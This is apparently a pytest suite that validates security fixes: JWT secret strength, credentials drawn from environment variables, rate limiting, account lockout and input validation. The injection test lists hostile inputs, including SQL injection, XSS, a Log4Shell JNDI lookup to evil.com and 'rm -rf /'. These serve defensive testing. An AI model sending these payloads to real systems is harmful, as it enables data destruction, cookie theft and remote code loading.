#!/usr/bin/env python3
"""
Security Fix Validation Tests
Tests to ensure all hardcoded credentials and security vulnerabilities are fixed.
"""

import os
import pytest
import tempfile
from unittest.mock import patch, MagicMock
from datetime import datetime, timedelta

# Add src to path for imports
import sys
sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'src'))

from core.security_manager import SecurityManager, SecurityConfig, SecurityLevel
from phase5_main import get_security_config, get_user_credentials


class TestSecurityFixes:
    """Test suite for security vulnerability fixes"""
    
    def test_no_hardcoded_jwt_secret_in_config(self):
        """Test that SecurityConfig no longer accepts hardcoded secrets"""
        # Test that default None value raises error
        with pytest.raises(ValueError, match="JWT secret is required"):
            SecurityConfig()
        
        # Test that weak secrets are rejected
        weak_secrets = [
            "your-secret-key",
            "your-secure-secret-key",
            "your-secure-secret-key-change-in-production",
            "secret",
            "password",
            "admin",
            "test"
        ]
        
        for weak_secret in weak_secrets:
            with pytest.raises(ValueError, match="JWT secret cannot be a default or weak value"):
                SecurityConfig(jwt_secret=weak_secret)
    
    def test_jwt_secret_length_validation(self):
        """Test JWT secret length validation"""
        # Test too short secret
        with pytest.raises(ValueError, match="JWT secret must be at least 32 characters"):
            SecurityConfig(jwt_secret="short")
        
        # Test exactly 32 characters (should pass)
        valid_secret = "a" * 32
        config = SecurityConfig(jwt_secret=valid_secret)
        assert config.jwt_secret == valid_secret
        
        # Test longer than 32 characters (should pass)
        long_secret = "a" * 64
        config = SecurityConfig(jwt_secret=long_secret)
        assert config.jwt_secret == long_secret
    
    def test_valid_strong_secret_accepted(self):
        """Test that strong, valid secrets are accepted"""
        strong_secret = "this-is-a-very-strong-secret-with-sufficient-length-and-complexity"
        config = SecurityConfig(jwt_secret=strong_secret)
        assert config.jwt_secret == strong_secret
    
    @patch.dict(os.environ, {}, clear=True)
    def test_get_security_config_requires_jwt_secret(self):
        """Test that get_security_config requires JWT_SECRET environment variable"""
        with pytest.raises(ValueError, match="JWT_SECRET environment variable is required"):
            get_security_config()
    
    @patch.dict(os.environ, {"JWT_SECRET": "strong-secret-for-testing-with-sufficient-length"})
    def test_get_security_config_with_valid_secret(self):
        """Test get_security_config with valid JWT secret"""
        config = get_security_config()
        assert config.jwt_secret == "strong-secret-for-testing-with-sufficient-length"
    
    @patch.dict(os.environ, {}, clear=True)
    def test_get_user_credentials_requires_environment_vars(self):
        """Test that get_user_credentials requires at least one user to be configured"""
        with pytest.raises(ValueError, match="No user credentials configured"):
            get_user_credentials()
    
    @patch.dict(os.environ, {
        "ADMIN_USERNAME": "secure_admin",
        "ADMIN_PASSWORD": "secure_admin_password_123",
        "OPERATOR_USERNAME": "secure_operator", 
        "OPERATOR_PASSWORD": "secure_operator_password_456"
    })
    def test_get_user_credentials_with_environment_vars(self):
        """Test get_user_credentials with proper environment variables"""
        credentials = get_user_credentials()
        
        assert "secure_admin" in credentials
        assert credentials["secure_admin"]["password"] == "secure_admin_password_123"
        assert credentials["secure_admin"]["security_level"] == SecurityLevel.ADMIN.value
        
        assert "secure_operator" in credentials
        assert credentials["secure_operator"]["password"] == "secure_operator_password_456"
        assert credentials["secure_operator"]["security_level"] == SecurityLevel.OPERATOR.value
    
    def test_no_hardcoded_credentials_in_functions(self):
        """Test that no hardcoded credentials exist in authentication functions"""
        # This test ensures the get_user_credentials function doesn't contain hardcoded values
        import inspect
        source = inspect.getsource(get_user_credentials)
        
        # Check that hardcoded credentials are not present
        forbidden_patterns = [
            '"admin"',
            '"admin123"',
            '"operator"', 
            '"operator123"',
            "'admin'",
            "'admin123'",
            "'operator'",
            "'operator123'"
        ]
        
        for pattern in forbidden_patterns:
            assert pattern not in source, f"Found hardcoded credential pattern: {pattern}"
    
    def test_security_manager_api_key_validation(self):
        """Test API key validation with secure configuration"""
        strong_secret = "very-strong-secret-for-testing-with-sufficient-length-and-complexity"
        config = SecurityConfig(jwt_secret=strong_secret)
        security_manager = SecurityManager(config)
        
        # Generate API key
        api_key = security_manager.generate_api_key("test_user", SecurityLevel.OPERATOR)
        
        # Validate API key
        valid, user_id, level = security_manager.validate_api_key(api_key)
        assert valid
        assert user_id == "test_user"
        assert level == SecurityLevel.OPERATOR
    
    def test_security_manager_jwt_validation(self):
        """Test JWT token validation with secure configuration"""
        strong_secret = "very-strong-secret-for-testing-with-sufficient-length-and-complexity"
        config = SecurityConfig(jwt_secret=strong_secret)
        security_manager = SecurityManager(config)
        
        # Generate JWT token
        jwt_token = security_manager.generate_jwt_token("test_user", SecurityLevel.ADMIN)
        
        # Validate JWT token
        valid, user_id, level = security_manager.validate_jwt_token(jwt_token)
        assert valid
        assert user_id == "test_user"
        assert level == SecurityLevel.ADMIN
    
    def test_rate_limiting_functionality(self):
        """Test rate limiting functionality"""
        strong_secret = "very-strong-secret-for-testing-with-sufficient-length-and-complexity"
        config = SecurityConfig(jwt_secret=strong_secret)
        config.rate_limiting.requests_per_minute = 2  # Low limit for testing
        
        security_manager = SecurityManager(config)
        
        # First request should pass
        assert security_manager.check_rate_limit("test_user", "127.0.0.1")
        
        # Second request should pass
        assert security_manager.check_rate_limit("test_user", "127.0.0.1")
        
        # Third request should fail (exceeds limit)
        assert not security_manager.check_rate_limit("test_user", "127.0.0.1")
    
    def test_account_lockout_functionality(self):
        """Test account lockout after failed attempts"""
        strong_secret = "very-strong-secret-for-testing-with-sufficient-length-and-complexity"
        config = SecurityConfig(
            jwt_secret=strong_secret,
            max_failed_attempts=2,
            lockout_duration_minutes=1
        )
        security_manager = SecurityManager(config)
        
        user_id = "test_user"
        
        # Record failed attempts
        security_manager.record_access_attempt("127.0.0.1", user_id, "/test", False, "Invalid credentials")
        assert not security_manager.is_account_locked(user_id)
        
        security_manager.record_access_attempt("127.0.0.1", user_id, "/test", False, "Invalid credentials")
        assert security_manager.is_account_locked(user_id)
    
    def test_input_validation_prevents_injection(self):
        """Test input validation prevents injection attacks"""
        strong_secret = "very-strong-secret-for-testing-with-sufficient-length-and-complexity"
        config = SecurityConfig(jwt_secret=strong_secret)
        security_manager = SecurityManager(config)
        
        # Test various injection attempts
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "javascript:alert(1)",
            "eval(document.cookie)",
            "${jndi:ldap://evil.com/a}",
            "exec('rm -rf /')"
        ]
        
        for malicious_input in malicious_inputs:
            valid, _ = security_manager.validate_command_input(malicious_input)
            assert not valid, f"Malicious input was not detected: {malicious_input}"
    
    def test_security_event_logging(self):
        """Test security event logging functionality"""
        strong_secret = "very-strong-secret-for-testing-with-sufficient-length-and-complexity"
        config = SecurityConfig(jwt_secret=strong_secret)
        security_manager = SecurityManager(config)
        
        # Log a security event
        security_manager.log_security_event(
            "TEST_EVENT",
            security_manager.ThreatLevel.MEDIUM,
            source_ip="127.0.0.1",
            user_id="test_user",
            description="Test security event"
        )
        
        # Check that event was recorded
        assert len(security_manager.security_events) == 1
        event = security_manager.security_events[0]
        assert event.event_type == "TEST_EVENT"
        assert event.source_ip == "127.0.0.1"
        assert event.user_id == "test_user"
    
    def test_threat_analysis_functionality(self):
        """Test threat analysis functionality"""
        strong_secret = "very-strong-secret-for-testing-with-sufficient-length-and-complexity"
        config = SecurityConfig(jwt_secret=strong_secret)
        security_manager = SecurityManager(config)
        
        # Generate some test events
        security_manager.log_security_event(
            "MALICIOUS_INPUT_DETECTED",
            security_manager.ThreatLevel.HIGH,
            source_ip="192.168.1.100",
            description="Potential SQL injection attempt"
        )
        
        # Get threat analysis
        analysis = security_manager.get_threat_analysis()
        
        assert "threat_level" in analysis
        assert "critical_events_24h" in analysis
        assert "recommendations" in analysis
        assert len(analysis["recommendations"]) > 0


class TestEnvironmentValidation:
    """Test environment validation functions"""
    
    @patch.dict(os.environ, {}, clear=True)
    def test_missing_jwt_secret_detection(self):
        """Test detection of missing JWT secret"""
        # Import the startup module
        sys.path.append(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..'))
        from start_phase5_mcp_server import Phase5ServerManager
        
        manager = Phase5ServerManager()
        
        # Should fail validation due to missing JWT_SECRET
        assert not manager.validate_environment()
    
    @patch.dict(os.environ, {"JWT_SECRET": "short"})
    def test_weak_jwt_secret_detection(self):
        """Test detection of weak JWT secret"""
        from start_phase5_mcp_server import Phase5ServerManager
        
        manager = Phase5ServerManager()
        
        # Should fail validation due to weak JWT secret
        assert not manager.validate_environment()
    
    @patch.dict(os.environ, {
        "JWT_SECRET": "very-strong-secret-for-testing-with-sufficient-length",
        "ADMIN_USERNAME": "secure_admin",
        "ADMIN_PASSWORD": "secure_password_123"
    })
    def test_valid_environment_passes_validation(self):
        """Test that valid environment passes validation"""
        with patch('start_phase5_mcp_server.settings') as mock_settings:
            mock_settings.backend_api_url = "http://localhost:8000"
            
            from start_phase5_mcp_server import Phase5ServerManager
            
            manager = Phase5ServerManager()
            
            # Should pass validation with valid configuration
            assert manager.validate_environment()


if __name__ == "__main__":
    pytest.main([__file__, "-v"])